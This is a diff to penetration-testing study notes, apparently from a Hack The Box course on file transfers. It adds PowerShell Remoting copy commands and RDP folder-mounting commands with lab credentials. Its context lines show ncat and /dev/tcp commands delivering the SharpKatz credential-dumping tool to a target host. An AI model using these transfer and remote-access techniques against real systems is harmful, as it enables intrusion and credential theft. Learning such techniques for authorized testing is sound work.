@@ -83,5 +83,67 @@ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 ```
 
-### Powershell Session File Transfer 
+### PowerShell Session File Transfer 
+
+- PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions
+- Enabling PowerShell remoting creates both an HTTP and an HTTPS listener
+- The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS
+
+To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa
+
+**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**
+```
+PS C:\htb> whoami
+
+htb\administrator
+
+PS C:\htb> hostname
+
+DC01
+```
+
+```
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+```
+
+Because this session already has privileges over DATABASE01, we don't need to specify credentials. In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session
+
+```
+$Session = New-PSSession -ComputerName DATABASE01
+```
+
+**Copy samplefile.txt from our Localhost to the DATABASE01 Session**
+```
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+**Copy DATABASE.txt from DATABASE01 Session to our Localhost**
+```
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+
+### RDP
+
+Use the Linux tools below to RDP into a machine:
+- xfreerdp
+- rdesktop
+- remmina
+
+As an alternative to copy and paste, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session
+
+
+**Mounting a Linux Folder Using rdesktop**
+```
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+
+**Mounting a Linux Folder Using xfreerdp**
+```
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+
+
+
+
 
